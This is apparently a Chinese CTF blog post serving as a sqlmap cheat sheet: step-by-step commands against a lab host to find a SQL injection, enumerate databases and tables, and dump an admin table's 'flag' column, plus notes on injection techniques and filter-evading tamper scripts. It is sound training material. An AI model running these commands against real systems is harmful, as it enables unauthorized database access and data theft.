---
tags:
  - CTF-WEB
categories:
  - CTF-WEB
date: 2020-02-02 16:45:00
cover: /img/post/12.jpg
---

---
### 一般流程
**1.检查注入点：**
sqlmap -u "http://192.168.0.182/" --data "word=1&number=5" --batch 
**2.爆所有数据库信息：**
sqlmap -u "http://192.168.0.182/" --data "word=1&number=5" --dbs --batch 
**3.爆当前数据库信息：**
sqlmap -u "http://192.168.0.182/" --data "word=1&number=5" --current-db --batch 
**4.指定库名列出所有表**
sqlmap -u "http://192.168.0.182/" --data "word=1&number=5" -D news --tables --batch 
'news' 为指定数据库名称
**5.指定库名表名列出所有字段**
sqlmap -u "http://192.168.0.182/" --data "word=1&number=5" -D news -T admin --column --batch 
'admin' 为指定表名称
**6.指定库名表名字段dump出指定字段**
sqlmap -u "http://192.168.0.182/" --data "word=1&number=5" -D news -T admin -C flag --dump --batch 


**说明**
-==D== 数据库名（database首字母）
-==T== 表名（table首字母）
-==C== 列名称（column首字母，可加多个参数，如-C "content,title,id"
--==data==="word=1&number=5"        数据字符串通过POST发送
--==batch==             永远不要要求用户输入，使用默认行为

--technique：
B: Boolean-based blind SQL injection（布尔型注入）
E: Error-based SQL injection（报错型注入）
U: UNION query SQL injection（可联合查询注入）
S: Stacked queries SQL injection（可多语句查询注入）
T: Time-based blind SQL injection（基于时间延迟注入）
==-v3 同时显示注入的payload。==

--tamper base64encode.py  让发送的数据先转换成base64
unmagicquotes.py 宽字节注入脚本
nonrecursivereplacement.py 双重语句替代预定义的sql关键字，往往需要更改下
randomcase.py  随机大小写
space2comment.py	将空格替换为/**/

